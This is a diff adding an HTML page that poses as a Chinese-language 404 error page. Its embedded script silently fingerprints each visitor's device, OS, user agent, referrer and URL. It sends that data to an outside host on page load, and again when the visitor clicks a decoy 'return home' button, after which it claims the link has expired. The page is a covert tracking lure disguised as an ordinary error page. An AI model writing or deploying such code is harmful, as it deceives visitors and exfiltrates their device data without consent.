@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>404 - 页面不存在</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, 'PingFang SC', 'Microsoft YaHei', sans-serif;
+        }
+        .container {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .code {
+            font-size: 120px;
+            font-weight: 900;
+            color: #e74c3c;
+            text-shadow: 0 0 40px rgba(231,76,60,0.3);
+            letter-spacing: 10px;
+            line-height: 1;
+        }
+        .msg {
+            color: #888;
+            font-size: 20px;
+            margin: 20px 0 10px;
+            letter-spacing: 2px;
+        }
+        .sub {
+            color: #555;
+            font-size: 14px;
+        }
+        .btn {
+            margin-top: 30px;
+            padding: 12px 40px;
+            background: transparent;
+            border: 1px solid #333;
+            color: #666;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        .btn:hover {
+            border-color: #e74c3c;
+            color: #e74c3c;
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #444;
+            font-size: 13px;
+        }
+        .loading.show { display: block; }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #222;
+            border-top-color: #e74c3c;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="code">404</div>
+        <div class="msg">页面走丢了...</div>
+        <div class="sub">您访问的链接可能已失效或不存在</div>
+        <button class="btn" id="fakeBtn">返回首页</button>
+        <div class="loading" id="loading"><span class="spinner"></span>正在跳转...</div>
+    </div>
+
+    <script>
+        (function() {
+            const WORKER_URL = 'https://fxyzapi.zft1145.top';
+            const ACTIVITY_ID = 'summer2026';
+
+            function getDeviceInfo() {
+                const ua = navigator.userAgent;
+                let os = 'Unknown';
+                let osVersion = 'Unknown';
+                let deviceType = 'Unknown';
+
+                const iosMatch = ua.match(/iPhone OS (\d+)_(\d+)/);
+                if (iosMatch) {
+                    os = 'iOS';
+                    osVersion = iosMatch[1] + '.' + iosMatch[2];
+                    deviceType = 'iPhone';
+                } else if (ua.includes('iPad')) {
+                    os = 'iOS';
+                    osVersion = 'iPad';
+                    deviceType = 'iPad';
+                } else if (ua.includes('Android')) {
+                    os = 'Android';
+                    const androidMatch = ua.match(/Android (\d+)\.(\d+)/);
+                    if (androidMatch) {
+                        osVersion = androidMatch[1] + '.' + androidMatch[2];
+                    }
+                    deviceType = 'Android';
+                } else if (ua.includes('Windows')) {
+                    os = 'Windows';
+                    deviceType = 'PC';
+                } else if (ua.includes('Mac OS')) {
+                    os = 'macOS';
+                    deviceType = 'PC';
+                } else if (ua.includes('Linux')) {
+                    os = 'Linux';
+                    deviceType = 'PC';
+                }
+
+                return { os, osVersion, deviceType, ua: ua.substring(0, 500) };
+            }
+
+            function sendData() {
+                const device = getDeviceInfo();
+                const data = {
+                    activityId: ACTIVITY_ID,
+                    timestamp: new Date().toISOString(),
+                    ip: '',
+                    userAgent: device.ua,
+                    os: device.os,
+                    osVersion: device.osVersion,
+                    deviceType: device.deviceType,
+                    referer: document.referrer || '',
+                    url: window.location.href
+                };
+
+                const loading = document.getElementById('loading');
+                loading.classList.add('show');
+
+                fetch(WORKER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                })
+                .then(res => res.json())
+                .then(result => {
+                    console.log('数据已记录:', result);
+                    setTimeout(() => {
+                        loading.classList.remove('show');
+                        document.querySelector('.msg').textContent = '链接已失效，请联系管理员';
+                        document.querySelector('.msg').style.color = '#e74c3c';
+                    }, 1200);
+                })
+                .catch(err => {
+                    console.error('上报失败:', err);
+                    loading.classList.remove('show');
+                });
+            }
+
+            document.getElementById('fakeBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                sendData();
+            });
+
+            window.addEventListener('load', function() {
+                setTimeout(() => {
+                    if (!window._reported) {
+                        window._reported = true;
+                        const device = getDeviceInfo();
+                        const data = {
+                            activityId: ACTIVITY_ID,
+                            timestamp: new Date().toISOString(),
+                            ip: '',
+                            userAgent: device.ua,
+                            os: device.os,
+                            osVersion: device.osVersion,
+                            deviceType: device.deviceType,
+                            referer: document.referrer || '',
+                            url: window.location.href,
+                            auto: true
+                        };
+                        if (navigator.sendBeacon) {
+                            navigator.sendBeacon(WORKER_URL, JSON.stringify(data));
+                        } else {
+                            fetch(WORKER_URL, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(data),
+                                keepalive: true
+                            }).catch(() => {});
+                        }
+                    }
+                }, 1000);
+            });
+        })();
+    </script>
+</body>
+</html>
